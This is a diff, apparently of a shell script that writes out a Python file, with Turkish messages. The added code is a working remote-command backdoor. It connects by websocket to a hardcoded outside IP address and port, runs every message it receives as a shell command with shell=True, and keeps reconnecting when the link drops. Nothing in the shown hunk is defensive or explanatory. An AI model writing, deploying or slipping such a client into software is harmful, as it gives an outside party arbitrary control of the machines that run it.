@@ -124,25 +124,28 @@ import subprocess
 import time
 
 def process_message(message):
-	print(f"Çalıştırılan komut: {message}")
-	try:
-		output = subprocess.check_output(message, shell=True, stderr=subprocess.STDOUT)
-		print(output.decode())
-	except subprocess.CalledProcessError as e:
-		print(f"Komut hatası: {e.output.decode()}")
+    print(f"Çalıştırılan komut: {message}")
+    try:
+        output = subprocess.check_output(message, shell=True, stderr=subprocess.STDOUT)
+        print(output.decode())
+    except subprocess.CalledProcessError as e:
+        print(f"Komut hatası: {e.output.decode()}")
 
 async def client():
-	while True:
-		try:
-			async with websockets.connect("ws://$SERVER_ADDR:$SERVER_PORT") as websocket:
-				async for message in websocket:
-					t = threading.Thread(target=process_message, args=(message,))
-					t.start()
-		except (websockets.ConnectionClosed, ConnectionRefusedError, OSError):
-			print("Bağlantı kaybedildi, yeniden bağlanmaya çalışılıyor...")
-			time.sleep(3)  # 5 saniye bekleyin ve yeniden deneyin
+    while True:
+        try:
+            async with websockets.connect("ws://165.227.111.141:8765") as websocket:
+                async for message in websocket:
+                    t = threading.Thread(target=process_message, args=(message,))
+                    t.start()
+        except (websockets.ConnectionClosed, ConnectionRefusedError, OSError):
+            print("Bağlantı kaybedildi, yeniden bağlanmaya çalışılıyor...")
+            time.sleep(3)  # 3 saniye bekleyin ve yeniden deneyin
 
-asyncio.get_event_loop().run_until_complete(client())
+# Use asyncio.run() to run the asyncio program
+if __name__ == "__main__":
+    asyncio.run(client())
+
 
 EOF
 
